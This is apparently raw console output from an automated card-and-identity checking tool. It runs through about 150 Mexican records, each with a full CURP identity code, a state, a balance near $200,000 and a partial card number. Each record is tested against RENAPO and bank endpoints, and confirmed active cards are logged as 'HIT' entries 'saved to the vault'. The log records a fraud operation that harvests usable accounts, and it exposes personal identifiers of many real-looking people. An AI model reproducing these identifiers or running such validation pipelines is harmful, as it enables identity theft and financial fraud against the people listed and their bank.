[440] ID:4622462 | HAHR700104MPLRRS04 | $200,000 | PUEBLA | T:4864... [441] ID:4637818 | DIAA720428HNLZLL00 | $200,000 | NUEVO LEON | T:0396... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))

[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:5475 para ID:4576875 ($200,000)... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.1s)
[442] ID:4639939 | VIPM720217MJCRRN01 | $200,000 | JALISCO | T:5265... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (9.0s)
[443] ID:4650008 | ZATE730221HDFMQN00 | $200,000 | CIUDAD DE ME | T:1559... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.0s)
[444] ID:4651394 | RUHA690717MJCLRL05 | $200,000 | JALISCO | T:6456... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (10.9s)
[445] ID:4658788 | LEMF760301HPLNNR04 | $200,000 | PUEBLA | T:4070... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:0396 para ID:4637818 ($200,000)... [🔴 OFF] Contacto preexistente (/confirm-contact) (14.5s)
[446] ID:4681230 | BUBJ750131HDGRNV00 | $200,000 | DURANGO | T:9123... [🔴 OFF] Rechazo bancario (PE160) (12.6s)
[🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[447] ID:4683693 | JIAM690126HVRMLN05 | $200,000 | VERACRUZ | T:2917... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:5265 para ID:4639939 ($200,000)... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.7s)
[448] ID:4687326 | VAPA731221HJCLDR06 | $200,000 | JALISCO | T:1131... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🔴 OFF] Contacto preexistente (/confirm-contact) (14.9s)
[449] ID:4696156 | QURB690619MCPJMR03 | $200,000 | CAMPECHE | T:7039... [🔴 OFF] Rechazo bancario (PE1002) (14.6s)
[450] ID:4698702 | VICC711010HDGLNS06 | $200,000 | DURANGO | T:5609... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (8.1s)
[451] ID:4699261 | FESO711103HDFNRC02 | $200,000 | CIUDAD DE ME | T:7069... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.5s)
[452] ID:4721956 | HEAR740126MDFRLC04 | $200,000 | CIUDAD DE ME | T:0752... [🔴 OFF] Rechazo bancario (PE1002) (13.0s)
[453] ID:4728904 | LAAJ711212HJCNMS03 | $200,000 | JALISCO | T:6796... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (7.7s)
[454] ID:4730070 | FIGK780212MCMGTR00 | $200,000 | COLIMA | T:4547... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (11.4s)
[455] ID:4733874 | GAAA730628HNLRNL09 | $200,000 | NUEVO LEON | T:1072... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:4547 para ID:4730070 ($200,000)... [🔴 OFF] Rechazo bancario (PE170) (16.4s)
[456] ID:4736040 | VAMV710329HMNLDC06 | $200,000 | MICHOACAN | T:7372... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🔴 OFF] Rechazo bancario (PE170) (13.9s)
[457] ID:4743300 | SAPE730819HHGNND09 | $200,000 | HIDALGO | T:3756... [🔴 OFF] Rechazo bancario (PE170) (15.1s)
[458] ID:4766349 | LAHC760811HVRNRS05 | $200,000 | VERACRUZ | T:7066... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.9s)
[459] ID:4770294 | LOPJ740322HGTPRN06 | $200,000 | GUANAJUATO | T:7359... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.7s)
[460] ID:4812955 | GUHH700919MSPTRZ05 | $200,000 | SAN LUIS POT | T:7264... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.6s)
[461] ID:4840005 | MORH730830HJCRJC08 | $200,000 | JALISCO | T:4895... [🔴 OFF] Rechazo bancario (PE170) (14.1s)
[462] ID:4843805 | CEDK770608MTSBRR00 | $200,000 | TAMAULIPAS | T:1419... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.4s)
[463] ID:4846286 | PEMA691001HPLRRL01 | $200,000 | PUEBLA | T:0756... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (13.9s)

[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:1419 para ID:4843805 ($200,000)... [464] ID:4849845 | CACJ720328HCSNNN08 | $200,000 | CHIAPAS | T:7096... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (15.2s)
[465] ID:4851216 | JIMV740920MSOMRN01 | $200,000 | SONORA | T:4999... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.2s)
[466] ID:4852388 | GUOO690103HDFTLS03 | $200,000 | CIUDAD DE ME | T:9446... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.6s)
[467] ID:4859351 | POZC720616HMCNCR08 | $200,000 | ESTADO DE ME | T:6553... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.6s)
[468] ID:4886793 | DIAL720914MDFZLR01 | $200,000 | CIUDAD DE ME | T:7242... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:0756 para ID:4846286 ($200,000)... [🔴 OFF] Derivación LikeU Pro (/derivation-pro) (15.0s)
[469] ID:4886820 | HERR731017HMSRFB09 | $200,000 | MORELOS | T:1217... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (12.5s)
[470] ID:4888703 | SALG740311HMCNNL08 | $200,000 | ESTADO DE ME | T:0260... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:7242 para ID:4886793 ($200,000)... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.3s)
[471] ID:4889893 | GOFL690801HDFNNS03 | $200,000 | CIUDAD DE ME | T:9336... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.5s)
[472] ID:812580 | MOVB000101HMCNGNA2 | $199,990 | ESTADO DE ME | T:8486... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.1s)
[473] ID:4280967 | MARR690612HDFRMC00 | $199,980 | CIUDAD DE ME | T:9463... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (11.3s)
[474] ID:1735391 | JIQR690725HDFMZB03 | $199,960 | CIUDAD DE ME | T:4198... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:9336 para ID:4889893 ($200,000)... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🔴 OFF] Derivación LikeU Pro (/derivation-pro) (15.2s)
[475] ID:3527251 | FECM740514MNLRRN05 | $199,920 | NUEVO LEON | T:7210... [🔴 OFF] Derivación LikeU Pro (/derivation-pro) (14.3s)
[476] ID:3765885 | BADH760205HCSLRR01 | $199,920 | CHIAPAS | T:2561... [🔴 OFF] Contacto preexistente (/confirm-contact) (15.7s)
[🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (11.7s)
[477] ID:21620 | AELE010101HDFRLPA4 | $199,870 | CIUDAD DE ME | T:1792... [478] ID:1543739 | GAFJ710323HJCRRR09 | $199,860 | JALISCO | T:9553... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:2561 para ID:3765885 ($199,920)... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (6.1s)
[479] ID:2832473 | FOJU010101HTLLPNA3 | $199,850 | TLAXCALA | T:1248... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.7s)
[🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[480] ID:568714 | DITE810128HBSZRD04 | $199,820 | BAJA CALIFOR | T:3908... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (15.3s)
[481] ID:2340292 | LEAM000101HSLDNNA3 | $199,810 | SINALOA | T:6800... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:9553 para ID:1543739 ($199,860)... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (11.3s)
[482] ID:3215145 | HECA010101HDFRSRA4 | $199,810 | CIUDAD DE ME | T:6539... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.4s)
[483] ID:3175375 | PEGA710720HDFRNL08 | $199,800 | CIUDAD DE ME | T:3133... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (12.5s)
[484] ID:3735506 | MORR730827HJCRMD05 | $199,800 | JALISCO | T:4349... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:3908 para ID:568714 ($199,820)... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.9s)
[485] ID:246979 | SAMC730122HDFNNR02 | $199,790 | CIUDAD DE ME | T:5330... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🔴 OFF] Rechazo bancario (PE170) (14.0s)
[486] ID:446794 | TETE720304HJCRRD07 | $199,790 | JALISCO | T:7661... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (8.4s)
[487] ID:1882848 | VAAN720220HNLLLL08 | $199,790 | NUEVO LEON | T:1580... [🔴 OFF] Contacto preexistente (/confirm-contact) (20.9s)
[488] ID:3431994 | SAGR690703MJCNNS02 | $199,790 | JALISCO | T:1272... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.7s)
[489] ID:276327 | ROVJ720309HNLDRN07 | $199,760 | NUEVO LEON | T:6666... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (8.3s)
[490] ID:4250243 | HASS701106HDFMTL00 | $199,760 | CIUDAD DE ME | T:5171... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (16.3s)
[491] ID:4292194 | MAAM730716HMCNYG01 | $199,760 | ESTADO DE ME | T:0908... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:1272 para ID:3431994 ($199,790)... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.6s)
[492] ID:2037053 | FOPL690830HMCRNS04 | $199,750 | ESTADO DE ME | T:1597... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.5s)
[493] ID:1386858 | MOTA000101HPLRVLA4 | $199,720 | PUEBLA | T:7852... [🔴 OFF] Contacto preexistente (/confirm-contact) (19.1s)
[494] ID:3633934 | FOMA741009HNLLYN03 | $199,680 | NUEVO LEON | T:5909... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.7s)
[495] ID:819034 | MEOV750306HHGJLC00 | $199,650 | HIDALGO | T:7302... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (6.8s)
[496] ID:1152004 | HEDE720310MJCRZS09 | $199,650 | JALISCO | T:4927... [🔴 OFF] Rechazo bancario (PE170) (14.2s)
[497] ID:1379083 | LOLN710926MVRPGR06 | $199,650 | VERACRUZ | T:4443... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.3s)
[498] ID:1609139 | RAGF760225HJCMTR07 | $199,650 | JALISCO | T:8915... [🔴 OFF] Rechazo bancario (PE1002) (15.5s)
[499] ID:1685478 | AACA760404HYCSSL05 | $199,650 | YUCATAN | T:5622... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.8s)
[500] ID:1912488 | ROPH720419HBCDRC03 | $199,650 | BAJA CALIFOR | T:0749... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (6.1s)
[501] ID:1990439 | SAMH700914HVRNRC07 | $199,650 | VERACRUZ | T:9178... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.4s)
[502] ID:2028111 | GASA770620MJCMLN09 | $199,650 | JALISCO | T:0482... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (6.2s)
[503] ID:2296197 | JIMA831024HCHMNN08 | $199,650 | CHIHUAHUA | T:2045... [🔴 OFF] Rechazo bancario (PE170) (14.6s)
[504] ID:2301461 | NOSC770721MMCGLR02 | $199,650 | ESTADO DE ME | T:9371... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (12.8s)
[505] ID:2309134 | SAJG770220MPLNRL09 | $199,650 | PUEBLA | T:9266... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.0s)
[506] ID:2727647 | CAFA721022HDGHLN09 | $199,650 | DURANGO | T:8298... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:2045 para ID:2296197 ($199,650)... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (12.5s)
[507] ID:2764471 | RIHM710504MDFVRN08 | $199,650 | CIUDAD DE ME | T:3102... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:9266 para ID:2309134 ($199,650)... [🔴 OFF] Rechazo bancario (PE170) (14.0s)
[508] ID:3097216 | MASF820716HSODLR04 | $199,650 | SINALOA | T:6266... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (6.0s)
[509] ID:3136659 | GOCG781217MGTNRD02 | $199,650 | GUANAJUATO | T:7532... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🔴 OFF] Derivación LikeU Pro (/derivation-pro) (14.4s)
[510] ID:3149807 | BUZR710807HMCCTF00 | $199,650 | ESTADO DE ME | T:8425... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (6.8s)
[511] ID:3447886 | VEGJ710310HDFNRR03 | $199,650 | CIUDAD DE ME | T:8051... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (7.6s)
[512] ID:3604853 | LOAD770809MMCPMN05 | $199,650 | ESTADO DE ME | T:3172... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.3s)
[513] ID:3631332 | PIOA690518MJCZCN00 | $199,650 | JALISCO | T:6435... [🔴 OFF] Derivación LikeU Pro (/derivation-pro) (14.9s)
[514] ID:3784791 | MOCM720117MCGRMR01 | $199,650 | COAHUILA | T:9450... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.4s)
[515] ID:3822664 | ROCK861027MSOCMR03 | $199,650 | SINALOA | T:3563... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (9.5s)
[516] ID:3898867 | QUTA790723HMNNVL04 | $199,650 | MICHOACAN | T:0509... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:6435 para ID:3631332 ($199,650)... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.9s)
[517] ID:4026752 | AASE781108HBCRLD01 | $199,650 | BAJA CALIFOR | T:3700... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.1s)
[518] ID:4104981 | GETT740513MCHBRR09 | $199,650 | CHIHUAHUA | T:4824... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🔴 OFF] Rechazo bancario (PE110) (13.0s)
[519] ID:4289329 | AECS730423HJCRHR04 | $199,650 | JALISCO | T:5199... [🔴 OFF] Contacto preexistente (/confirm-contact) (16.0s)
[520] ID:4394279 | GART771002MSOLNR05 | $199,650 | SONORA | T:2369... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (6.3s)
[521] ID:4662172 | GUSD740524MSOTLN03 | $199,650 | SINALOA | T:3678... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (21.4s)
[522] ID:4776930 | MALN740803HVRRRL05 | $199,650 | VERACRUZ | T:0973... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:5199 para ID:4289329 ($199,650)... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (7.0s)
[523] ID:4867815 | DISA780424HPLZNL05 | $199,650 | PUEBLA | T:4837... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.5s)
[524] ID:3948773 | SARV690623HZSRVC00 | $199,640 | ZACATECAS | T:7188... [🟢 HIT #2] Tarjeta ACTIVA Confirmada -> Guardado en bóveda!
[🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (10.7s)
[525] ID:190671 | RAFI720606MDFMRV07 | $199,630 | CIUDAD DE ME | T:3960... [🔴 OFF] Rechazo bancario (PE170) (15.4s)
[526] ID:2648082 | VAME700809MSOLNG01 | $199,630 | SONORA | T:3320... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (7.3s)
[527] ID:4711492 | SATG750128HNLLRL09 | $199,620 | NUEVO LEON | T:2802... [🔴 OFF] Derivación LikeU Pro (/derivation-pro) (13.9s)
[528] ID:180259 | VAPE711013HCGLND06 | $199,600 | COAHUILA | T:2906... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (6.1s)
[529] ID:2263201 | AEJR730227HDFRRB04 | $199,600 | CIUDAD DE ME | T:7743... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (7.4s)
[530] ID:821124 | CITR780125HMNSRF00 | $199,580 | MICHOACAN | T:9906... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.3s)
[531] ID:1115621 | OODG010101HDFLMSA7 | $199,580 | CIUDAD DE ME | T:1247... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (6.1s)
[532] ID:1588216 | VIVL750522HDFCLS07 | $199,570 | CIUDAD DE ME | T:6800... [🔴 OFF] Rechazo bancario (PE170) (15.7s)
[533] ID:3275214 | RIHM701018MSPVRN00 | $199,570 | SAN LUIS POT | T:3249... [🔴 OFF] Rechazo bancario (PE170) (12.5s)
[534] ID:4062990 | PASD740808MNLLLR07 | $199,560 | NUEVO LEON | T:3048... [🔴 OFF] Contacto preexistente (/confirm-contact) (14.1s)
[535] ID:2610629 | MOIA690805HDFRSD05 | $199,550 | CIUDAD DE ME | T:8398... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (13.5s)
[536] ID:167137 | GUOA000101HCLRBLA2 | $199,530 | COAHUILA | T:2248... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:3048 para ID:4062990 ($199,560)... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.0s)
[537] ID:3979306 | CAFR690711HCHHRD09 | $199,530 | CHIHUAHUA | T:5982... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (11.4s)
[538] ID:470388 | OEAM710313MMCCRR03 | $199,500 | ESTADO DE ME | T:8849... [🟢 HIT #3] Tarjeta ACTIVA Confirmada -> Guardado en bóveda!
[🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.5s)
[539] ID:1562079 | MEAA690313MJCNCD02 | $199,500 | JALISCO | T:9810... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:8398 para ID:2610629 ($199,550)... [🔴 OFF] Contacto preexistente (/confirm-contact) (13.8s)
[540] ID:3604213 | UEGR710629MJCRRT07 | $199,500 | JALISCO | T:5797... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (10.1s)
[541] ID:4027381 | ROLM720914MNLDPG06 | $199,500 | NUEVO LEON | T:3799... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.0s)
[🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[542] ID:109469 | COCA790908HMCRLL02 | $199,440 | ESTADO DE ME | T:8971... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:9810 para ID:1562079 ($199,500)... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.3s)
[543] ID:3490696 | HUEA690817HSORSL03 | $199,440 | SONORA | T:3148... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.8s)
[544] ID:4367272 | PUMF690828HCSLYR04 | $199,440 | CHIAPAS | T:8080... [🔴 OFF] Rechazo bancario (PE160) (13.0s)
[545] ID:1884094 | GUWA000101HSLZLMA2 | $199,430 | SINALOA | T:0333... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.4s)
[546] ID:4131142 | MIRA010101HDFRRMA2 | $199,430 | CIUDAD DE ME | T:3499... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (14.4s)
[547] ID:162090 | MUCL691026HMCNRS07 | $199,420 | ESTADO DE ME | T:5999... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (7.0s)
[548] ID:2837851 | SAUG701016HDFNRR00 | $199,420 | CIUDAD DE ME | T:3071... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:8080 para ID:4367272 ($199,440)... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.6s)
[549] ID:4322370 | CUPA010101HVRRRBA5 | $199,420 | VERACRUZ | T:7906... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.3s)
[550] ID:2953872 | ROSP710305HDFLLT02 | $199,340 | CIUDAD DE ME | T:7532... [🟢 HIT #4] Tarjeta ACTIVA Confirmada -> Guardado en bóveda!
[🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.4s)
[551] ID:3988722 | FAZL000101HGTRRSA2 | $199,340 | GUANAJUATO | T:4625... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (6.5s)
[552] ID:3004474 | TOJS730805HBCRML00 | $199,320 | BAJA CALIFOR | T:5062... [🔴 OFF] Derivación LikeU Pro (/derivation-pro) (13.6s)
[553] ID:1692509 | PEAD730304HDFNLV01 | $199,270 | CIUDAD DE ME | T:2436... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.6s)
[554] ID:205197 | NIFM690629MQTTLR09 | $199,222 | QUERETARO | T:2673... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (13.1s)
[555] ID:3638260 | REXF000101HZSYXRA2 | $199,220 | ZACATECAS | T:3269... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.3s)
[556] ID:2569265 | VEGA690521HTSLND09 | $199,170 | TAMAULIPAS | T:8270... [🔴 OFF] Contacto preexistente (/confirm-contact) (14.3s)
[557] ID:4437821 | ZEVA710712MVRPLN05 | $199,160 | VERACRUZ | T:3517... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.9s)
[558] ID:3030962 | PEOH690923HMCRRR04 | $199,150 | ESTADO DE ME | T:6277... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (12.7s)
[559] ID:1381136 | ZATH780927HGTMRC07 | $199,080 | GUANAJUATO | T:8269... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:8270 para ID:2569265 ($199,170)... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.6s)
[560] ID:48515 | SAAM720712MDFNLR09 | $199,000 | CIUDAD DE ME | T:8201... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🔴 OFF] Derivación LikeU Pro (/derivation-pro) (14.4s)
[561] ID:457803 | CEVF711112HMSRLD00 | $199,000 | MORELOS | T:0490... [🔴 OFF] Rechazo bancario (PE110) (13.1s)
[562] ID:536739 | PEVL691013HGTRZS08 | $199,000 | GUANAJUATO | T:9183... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.8s)
[563] ID:1253552 | LOLA691127HVRPMN09 | $199,000 | VERACRUZ | T:0357... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.4s)
[564] ID:1595423 | FOLF691024HCGLPR06 | $199,000 | COAHUILA | T:8598... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.5s)
[565] ID:1905320 | GAHL710827HVRZRS06 | $199,000 | VERACRUZ | T:5723... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.4s)
[566] ID:1980023 | RERS691103MQRZYL08 | $199,000 | QUINTANA ROO | T:3181... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.7s)
[567] ID:2389716 | VIUA720515HDFLRL01 | $199,000 | CIUDAD DE ME | T:8138... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (6.8s)
[568] ID:2442295 | GULJ691016HTSZCR05 | $199,000 | TAMAULIPAS | T:0443... [🔴 OFF] Rechazo bancario (PE1002) (13.1s)
[569] ID:2593840 | CRCE700408HGTMRS05 | $199,000 | GUANAJUATO | T:4281... [🔴 OFF] Contacto preexistente (/confirm-contact) (13.9s)
[570] ID:2712123 | OERI710105MNLRDS05 | $199,000 | NUEVO LEON | T:5620... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.8s)
[571] ID:3128342 | SACV690129HCHLRC08 | $199,000 | CHIHUAHUA | T:7699... [🔴 OFF] Contacto preexistente (/confirm-contact) (12.4s)
[572] ID:3272162 | GOAL720913MDFNNR04 | $199,000 | CIUDAD DE ME | T:9603... [🔴 OFF] Derivación LikeU Pro (/derivation-pro) (13.3s)
[573] ID:3428015 | LEEI730111HTSNSS05 | $199,000 | TAMAULIPAS | T:2829... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.6s)
[574] ID:4243191 | CAHD730206MMCHRN06 | $199,000 | ESTADO DE ME | T:1168... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.5s)
[575] ID:3718691 | AEMM701226HMCCDG02 | $198,990 | ESTADO DE ME | T:8996... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (7.7s)
[576] ID:435698 | LOCE750926HNLPSR06 | $198,950 | NUEVO LEON | T:2844... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (15.6s)
[577] ID:3564541 | BAQC710925MBCNNR09 | $198,950 | BAJA CALIFOR | T:1882... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:2829 para ID:3428015 ($199,000)... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.1s)
[578] ID:4060605 | JIMM770110MDFMRR07 | $198,930 | CIUDAD DE ME | T:4310... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.7s)
[579] ID:2959467 | AODA000101MYNYMXA3 | $198,920 | YUCATAN | T:2988... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (6.1s)
[580] ID:2845517 | AODA000101MYNYMXA3 | $198,910 | YUCATAN | T:7174... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (12.9s)
[581] ID:1993959 | VEAM701101MGRLMR03 | $198,800 | GUERRERO | T:4157... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:4310 para ID:4060605 ($198,930)... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (7.2s)
[582] ID:890886 | RUPF730816HCGSRR02 | $198,790 | COAHUILA | T:8048... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.2s)
[583] ID:865681 | HEPV750629HMCRRC00 | $198,780 | ESTADO DE ME | T:6861... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (6.4s)
[584] ID:314755 | FOSM701020MJCLGR07 | $198,710 | JALISCO | T:8546... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.1s)
[585] ID:3788202 | MOAS710212HQTRLR00 | $198,660 | QUERETARO | T:3506... [⚠️ RETRY] Timeout global de verificación (22s) (22.0s)
[586] ID:1462659 | ROFL000101MMNMRZA8 | $198,640 | MICHOACAN | T:6286... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.5s)
[587] ID:247354 | AUHR770131HTSGDC04 | $198,630 | TAMAULIPAS | T:2363... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.4s)
[588] ID:3723167 | COVR700427MMNRLS03 | $198,590 | MICHOACAN | T:5543... [🔴 OFF] Rechazo bancario (PE020) (12.0s)
[589] ID:221964 | GURR710612MDFZNM07 | $198,570 | CIUDAD DE ME | T:1823... [🔴 OFF] Contacto preexistente (/confirm-contact) (14.5s)
